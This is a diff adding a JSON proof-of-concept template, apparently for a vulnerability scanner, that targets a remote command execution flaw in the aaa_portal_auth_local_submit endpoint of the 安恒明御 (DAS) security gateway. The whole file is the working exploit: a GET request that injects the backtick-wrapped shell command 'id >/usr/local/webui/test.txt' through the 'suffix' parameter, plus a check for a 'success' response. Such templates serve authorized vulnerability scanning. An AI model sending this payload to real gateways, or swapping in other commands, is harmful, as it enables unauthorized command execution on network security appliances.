@@ -1,0 +1,19 @@
+{
+  "poc": "安恒明御安全网关aaa_portal_auth_local_submit远程命令执行",
+  "req":[
+    {
+      "method": "GET",
+      "uri": "/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&suffix={{urlenc(`id >/usr/local/webui/test.txt`)}}",
+      "headers":{
+        "user-agent": "5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
+        "content-type": "application/x-www-form-urlencoded"
+      },
+      "data": "",
+      "check":{
+        "status": 200,
+        "header_words": [],
+        "body_words": ["success"]
+      }
+    }
+  ]
+}
